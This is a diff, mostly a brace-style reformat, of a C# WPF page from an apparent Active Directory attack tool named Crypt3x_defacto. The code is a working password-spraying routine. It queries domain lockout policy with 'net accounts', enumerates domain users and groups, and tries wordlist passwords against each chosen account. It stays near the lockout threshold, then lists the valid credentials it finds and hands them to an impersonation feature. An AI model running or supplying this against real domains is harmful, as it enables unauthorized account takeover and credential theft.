@@ -8,11 +8,13 @@ using System.Windows.Controls;
 using System.Windows.Forms;
 using System.Windows.Media;
 
-namespace Crypt3x_defacto {
+namespace Crypt3x_defacto
+{
     /// <summary>
     /// Interaction logic for PasswordSpraying.xaml
     /// </summary>
-    public partial class PasswordSpraying : Page {
+    public partial class PasswordSpraying : Page
+    {
         Policy PolicyObj;
         List<string> pass = new List<string>();
         List<User> ADusers = new List<User>();
@@ -20,13 +22,16 @@ namespace Crypt3x_defacto {
         List<User> spray_users = new List<User>();
         List<UserCredentials> authenticated_users = new List<UserCredentials>();
 
-        struct UserCredentials {
+        struct UserCredentials
+        {
             public string Username { get; set; }
             public string Password { get; set; }
         };
 
-        class User {
-            public User(GetUserInfo.User u) {
+        class User
+        {
+            public User(GetUserInfo.User u)
+            {
                 name = u.Full_Name;
                 display_name = u.Display_Name;
                 domain = u.Domain;
@@ -41,7 +46,8 @@ namespace Crypt3x_defacto {
             public string password_last_set;
         };
 
-        struct Policy {
+        struct Policy
+        {
             public string logoff;
 
             // password
@@ -60,26 +66,33 @@ namespace Crypt3x_defacto {
         };
 
 
-        public PasswordSpraying() {
+        public PasswordSpraying()
+        {
             InitializeComponent();
         }
 
-        public void get_policy() {
+        public void get_policy()
+        {
             var policy = new List<string>();
-            try {
+            try
+            {
                 var lines = Helper.Functions.runCMD("net", "accounts");
-                foreach (var s in lines) {
+                foreach (var s in lines)
+                {
                     var start = s.IndexOf(':') + 1;
                     if (start != 0)
                         policy.Add(s.Substring(start, s.Length - start).Trim());
                 }
                 set_policy(policy);
-            } catch {
+            }
+            catch
+            {
                 System.Windows.MessageBox.Show("Sorry, cannot access the domain policy rules");
             }
         }
 
-        public void set_policy(List<string> policy) {
+        public void set_policy(List<string> policy)
+        {
             PolicyObj.logoff = policy[0];
             PolicyObj.min_age = policy[1];
             PolicyObj.max_age = policy[2];
@@ -91,11 +104,13 @@ namespace Crypt3x_defacto {
             PolicyObj.role = policy[8];
         }
 
-        public async void GetADUsers() {
+        public async void GetADUsers()
+        {
             var domain = new SortedSet<string>();
             var users = await GetUserInfo.get_users();
 
-            foreach (var u in users) {
+            foreach (var u in users)
+            {
                 domain.Add(u.Domain);
                 ADusers.Add(new User(u));
             }
@@ -103,33 +118,43 @@ namespace Crypt3x_defacto {
             listBox0.ItemsSource = domain;
         }
 
-        private void button_Click(object sender, RoutedEventArgs e) {
+        private void button_Click(object sender, RoutedEventArgs e)
+        {
             var dlg = new OpenFileDialog();
-            if (dlg.ShowDialog() == DialogResult.OK) {
+            if (dlg.ShowDialog() == DialogResult.OK)
+            {
                 var file = dlg.FileName;
                 loadTxt.Text = file;
                 try { pass = File.ReadAllLines(file).ToList(); } catch (IOException) { }
             }
         }
 
-        async private void start_btn_Click(object sender, RoutedEventArgs e) {
+        async private void start_btn_Click(object sender, RoutedEventArgs e)
+        {
             authenticated_users.Clear();
             authenticated_grid.ItemsSource = null;
             authenticated_grid.Items.Clear();
             authenticated_grid.Items.Refresh();
 
             int account, password_length;
-            if (int.TryParse(PolicyObj.length, out password_length)) {
-            } else password_length = 0;
-            if (int.TryParse(PolicyObj.threshold, out account)) {
-            } else account = 0;
+            if (int.TryParse(PolicyObj.length, out password_length))
+            {
+            }
+            else password_length = 0;
+            if (int.TryParse(PolicyObj.threshold, out account))
+            {
+            }
+            else account = 0;
 
-            try {
+            try
+            {
                 SystemInfo.page.disableSignIn();
                 start_btn.IsEnabled = false;
                 get_spray_users();
-                foreach (var p in pass) {
-                    if (p.Length >= password_length) {
+                foreach (var p in pass)
+                {
+                    if (p.Length >= password_length)
+                    {
                         --account;
                         foreach (var u in spray_users)
                             await Task.Run(() => signIn(u.name, p));
@@ -142,37 +167,49 @@ namespace Crypt3x_defacto {
                 status.Text = "Spray Completed";
                 start_btn.IsEnabled = true;
                 SystemInfo.page.enableSignIn();
-            } catch { }
+            }
+            catch { }
         }
 
-        private void get_spray_users() {
+        private void get_spray_users()
+        {
             var temp_spray_users = new HashSet<string>();
             foreach (ListBoxItem l in listBox2.Items)
                 temp_spray_users.Add(l.Content.ToString());
 
-            foreach (var u in ADusers) {
-                if (u.display_name != null && temp_spray_users.Contains(u.display_name)) {
+            foreach (var u in ADusers)
+            {
+                if (u.display_name != null && temp_spray_users.Contains(u.display_name))
+                {
                     spray_users.Add(u);
                     temp_spray_users.Remove(u.display_name);
-                } else if (u.name != null && temp_spray_users.Contains(u.name)) {
+                }
+                else if (u.name != null && temp_spray_users.Contains(u.name))
+                {
                     spray_users.Add(u);
                     temp_spray_users.Remove(u.name);
                 }
             }
         }
 
-        public void signIn(string u, string p) {
-            Dispatcher.Invoke(() => {
+        public void signIn(string u, string p)
+        {
+            Dispatcher.Invoke(() =>
+            {
                 status.Text = "Trying password: " + p + " on username: " + u;
             });
 
-            using (var pc = new PrincipalContext(ContextType.Domain, SystemInfo.UserDomainName)) {
-                if (pc.ValidateCredentials(u, p)) {
-                    authenticated_users.Add(new UserCredentials {
+            using (var pc = new PrincipalContext(ContextType.Domain, SystemInfo.UserDomainName))
+            {
+                if (pc.ValidateCredentials(u, p))
+                {
+                    authenticated_users.Add(new UserCredentials
+                    {
                         Password = p,
                         Username = u
                     });
-                    Dispatcher.Invoke(() => {
+                    Dispatcher.Invoke(() =>
+                    {
                         SystemInfo.page.addChildToImpersonationTree(u, SystemInfo.UserDomainName, p);
                         authenticated_grid.ItemsSource = authenticated_users;
                         authenticated_grid.Items.Refresh();
@@ -181,34 +218,44 @@ namespace Crypt3x_defacto {
             }
         }
 
-        private void listBox_Selected(object sender, RoutedEventArgs e) {
+        private void listBox_Selected(object sender, RoutedEventArgs e)
+        {
             listBox1.Items.Clear();
             listBox2.Items.Clear();
             listBox1.Items.Add("All Users");
-            try {
+            try
+            {
                 foreach (var u in ADusers)
                     if (listBox0.SelectedItem.Equals(u.domain))
                         domain_groups.Add(u.domain_group);
                 foreach (var s in domain_groups)
                     listBox1.Items.Add(s);
                 domain_groups.Clear();
-            } catch { }
+            }
+            catch { }
         }
 
-        private void listBox1_MouseUp(object sender, System.Windows.Input.MouseButtonEventArgs e) {
+        private void listBox1_MouseUp(object sender, System.Windows.Input.MouseButtonEventArgs e)
+        {
             var domain_users = new SortedSet<string>();
             spray_users.Clear();
 
-            foreach (var u in ADusers) {
-                if (u.domain != null && listBox0.SelectedItem.Equals(u.domain)) {
-                    if (listBox1.SelectedIndex == 0) {
+            foreach (var u in ADusers)
+            {
+                if (u.domain != null && listBox0.SelectedItem.Equals(u.domain))
+                {
+                    if (listBox1.SelectedIndex == 0)
+                    {
                         if (u.display_name != null && u.display_name != "")
                             domain_users.Add(u.display_name);
                         else
                             domain_users.Add(u.name);
-                    } else {
-                        foreach (string s in listBox1.SelectedItems) {
-                            if (u.domain_group != null && u.domain_group.Equals(s)) {
+                    }
+                    else {
+                        foreach (string s in listBox1.SelectedItems)
+                        {
+                            if (u.domain_group != null && u.domain_group.Equals(s))
+                            {
                                 if (u.display_name != null && u.display_name != "")
                                     domain_users.Add(u.display_name);
                                 else
@@ -221,19 +268,24 @@ namespace Crypt3x_defacto {
             }
 
             listBox2.Items.Clear();
-            foreach (var s in domain_users) {
-                listBox2.Items.Add(new ListBoxItem {
+            foreach (var s in domain_users)
+            {
+                listBox2.Items.Add(new ListBoxItem
+                {
                     Content = s,
                     IsSelected = true
                 });
             }
         }
 
-        private void authenticated_grid_LoadingRow(object sender, DataGridRowEventArgs e) {
-            try {
+        private void authenticated_grid_LoadingRow(object sender, DataGridRowEventArgs e)
+        {
+            try
+            {
                 e.Row.Background = Helper.Functions.SolidColorBrushFromHex("#0CB754");
                 e.Row.Foreground = new SolidColorBrush(Colors.White);
-            } catch { }
+            }
+            catch { }
         }
     }
 }
